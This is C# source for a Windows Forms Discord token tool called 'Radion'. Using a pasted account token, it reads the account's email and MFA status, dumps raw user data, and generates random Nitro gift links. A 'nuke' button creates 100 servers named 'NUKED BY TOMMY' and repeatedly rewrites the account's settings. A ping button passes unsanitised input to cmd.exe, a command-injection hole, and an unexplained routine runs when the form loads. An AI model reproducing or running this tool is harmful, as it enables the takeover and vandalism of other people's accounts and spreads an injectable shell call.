using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace Radion
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public Form1()
        {
            InitializeComponent();
            this.StyleManager = metroStyleManager1;
            this.Opacity = metroTrackBar1.Value;
        }

        private void LoadData()
        {
            metroComboBox2.SelectedIndex = Properties.Settings.Default.colour;
            metroComboBox1.SelectedIndex = Properties.Settings.Default.theme;
            metroCheckBox1.Checked = Properties.Settings.Default.showPwd;
            metroTrackBar1.Value = (int)Properties.Settings.Default.opacity;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            LoadData();
            Radion.funnyThings.startThings();

            if (metroCheckBox1.Checked == true)
            {
                metroTextBox1.UseSystemPasswordChar = true;
            }else
            {
                metroTextBox1.UseSystemPasswordChar = false;
            }
        }

        private void metroComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (metroComboBox1.SelectedIndex)
            {
                case 0:
                    metroStyleManager1.Theme = MetroFramework.MetroThemeStyle.Dark;
                    break;
                case 1:
                    metroStyleManager1.Theme = MetroFramework.MetroThemeStyle.Light;
                    break;
            }
        }

        private void metroComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (metroComboBox2.SelectedIndex)
            {
                case 0:
                    metroStyleManager1.Style = MetroFramework.MetroColorStyle.Blue;
                    break;
                case 1:
                    metroStyleManager1.Style = MetroFramework.MetroColorStyle.Red;
                    break;
                case 2:
                    metroStyleManager1.Style = MetroFramework.MetroColorStyle.Purple;
                    break;
                case 3:
                    metroStyleManager1.Style = MetroFramework.MetroColorStyle.Orange;
                    break;
                case 4:
                    metroStyleManager1.Style = MetroFramework.MetroColorStyle.Yellow;
                    break;
            }
        }

        private void SaveData()
        {
            try
            {
                Properties.Settings.Default.theme = metroComboBox1.SelectedIndex;
                Properties.Settings.Default.colour = metroComboBox2.SelectedIndex;
                Properties.Settings.Default.showPwd = metroCheckBox1.Checked;
                Properties.Settings.Default.opacity = metroTrackBar1.Value;
                Properties.Settings.Default.Save();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "An Error occured!");
            }
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            SaveData();
        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox1.Checked == true)
            {
                metroTextBox1.UseSystemPasswordChar = true;
            }
            else
            {
                metroTextBox1.UseSystemPasswordChar = false;
            }
        }

        private void metroTrackBar1_Scroll(object sender, ScrollEventArgs e)
        {
            Opacity = (double)metroTrackBar1.Value / 100;
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            string token = metroTextBox1.Text;
            string emailBox = Discord.REQ.UserProfile.Email(token);
            string avatarurlBox = Discord.REQ.UserProfile.AvatarHash(token);
            string usernameBox = Discord.REQ.UserProfile.UserName(token);
            string discrminatorBox = Discord.REQ.UserProfile.Discriminator(token);
            string languageBox = Discord.REQ.UserProfile.Langage(token);
            bool mfaBox = Discord.REQ.UserProfile.MfaEnable(token);

            if (mfaBox == true)
            {
                metroTextBox9.Text = "True";
            } else
            {
                metroTextBox9.Text = "False";
            }

            metroTextBox3.Text = emailBox;

            if (avatarurlBox == null)
            {
                metroTextBox4.Text = "Null";
            } else
            {
                metroTextBox4.Text = avatarurlBox;
            }

            metroTextBox5.Text = usernameBox;
            metroTextBox2.Text = discrminatorBox;
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            string code = Discord.REQ.Nitro.GenCode();
            metroTextBox6.Text = "https://discord.gift/" + code;
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            string idk = Discord.REQ.UserProfile.GetBruteInfo(metroTextBox1.Text);
            MessageBox.Show(idk, "Raw User Data");
        }

        private void metroTextBox8_Click(object sender, EventArgs e)
        {

        }

        private void metroButton5_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPage1_Click(object sender, EventArgs e)
        {

        }

        private void metroButton5_Click_1(object sender, EventArgs e)
        {

            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine("ping" + metroTextBox8.Text);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            string token = metroTextBox1.Text;

            for (int i = 0; i < 100; i++)
            {
                Discord.REQ.Guild.Create("NUKED BY TOMMY", token);
            }

            for (int i = 0; i < 100; i++)
            {
                Discord.REQ.UserSettings.SetDisplayCompactON(token);
                Discord.REQ.UserSettings.SetDisplayCompactOFF(token);
                Discord.REQ.UserSettings.SetLanguage("ru", token);
                Discord.REQ.UserSettings.SetLanguage("en", token);
                Discord.REQ.UserSettings.SetThemeLight(token);
                Discord.REQ.UserSettings.SetThemeDark(token);
            }

            
            
        }
    }
}